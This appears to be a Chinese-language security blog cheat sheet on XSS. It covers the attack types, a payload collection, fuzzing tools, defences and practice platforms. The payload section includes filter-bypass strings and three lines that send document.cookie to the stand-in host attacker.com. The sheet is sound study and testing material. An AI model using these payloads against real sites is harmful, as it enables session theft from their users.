---
title: xss注入备忘录
author: ak
description: "xss注入备忘录"
pubDate: 2025-05-08
tags: ["安全", "xss", "渗透"]
---

# XSS注入备忘录

## 什么是XSS？

XSS（跨站脚本攻击）是一种常见的web安全漏洞，攻击者通过在网页中注入恶意脚本，使之在用户的浏览器上运行。这些脚本能够读取cookie、session tokens、或其他敏感信息。

## XSS的类型

1. **反射型XSS**
   - 非持久化，需要用户点击特制的链接
   - payload通常在URL参数中

2. **存储型XSS**
   - 恶意代码存储在目标服务器中
   - 受害者浏览页面时触发
   
3. **DOM型XSS**
   - 发生在客户端JavaScript执行过程中
   - 不涉及服务器端代码

## 常用XSS Payload合集

### 基础测试
```javascript
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
```

### 图片标签XSS
```javascript
<img src="javascript:alert('XSS')">
<img src=x onerror="alert('XSS')">
<img src=x oneonerrorrror=alert(1)>
```

### 事件处理器
```javascript
<body onload="alert('XSS')">
<input type="text" onmouseover="alert('XSS')">
<div onmouseover="alert('XSS')">
```

### 绕过过滤器
```javascript
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<script>al\u0065rt('XSS')</script>
<img src=x onerror="&#97;lert('XSS')">
```

### SVG XSS
```javascript
<svg/onload=alert('XSS')>
<svg><script>alert('XSS')</script></svg>
```

### 高级Payload
```javascript
<script>fetch('http://attacker.com/'+document.cookie)</script>
<script>new Image().src='http://attacker.com/'+document.cookie</script>
<script>window.location='http://attacker.com?cookie='+document.cookie</script>
```

## 常用XSS Fuzzing工具

### 1. XSStrike
- 功能：自动化XSS检测和利用
- 特点：
  - 支持DOM XSS检测
  - 智能payload生成
  - WAF绕过技术
- 安装：`pip install xsstrike`

### 2. XSS Hunter
- 功能：高级XSS漏洞检测平台
- 特点：
  - 自动收集截图
  - 获取DOM快照
  - 支持盲XSS检测

### 3. Burp Suite - Active Scanner
- 功能：专业的Web应用安全测试
- 特点：
  - 自动化扫描
  - 详细报告生成
  - 自定义payload支持

### 4. BeEF (Browser Exploitation Framework)
- 功能：浏览器漏洞利用框架
- 特点：
  - 实时hook管理
  - 社会工程学模块
  - 详细的命令控制界面

## XSS防御措施

1. **输入验证**
   - 白名单验证
   - 特殊字符过滤

2. **输出编码**
   - HTML编码
   - JavaScript编码
   - URL编码

3. **安全Headers**
   - Content-Security-Policy (CSP)
   - X-XSS-Protection
   - X-Content-Type-Options

4. **Cookie安全**
   - HttpOnly标记
   - Secure标记
   - SameSite属性

## 实用工具和资源

1. **在线XSS测试平台**
   - XSS Game (Google)
   - PortSwigger Web Security Academy
   - OWASP Juice Shop

2. **XSS Payload数据库**
   - PayloadsAllTheThings
   - XSS Filter Evasion Cheat Sheet
   - HTML5 Security Cheatsheet

## 总结

XSS漏洞虽然是一个古老的安全问题，但至今仍然广泛存在于Web应用中。了解各种XSS攻击方式和防御措施对于开发安全的Web应用至关重要。定期更新安全知识，使用现代的安全框架和最佳实践，可以有效降低XSS风险。 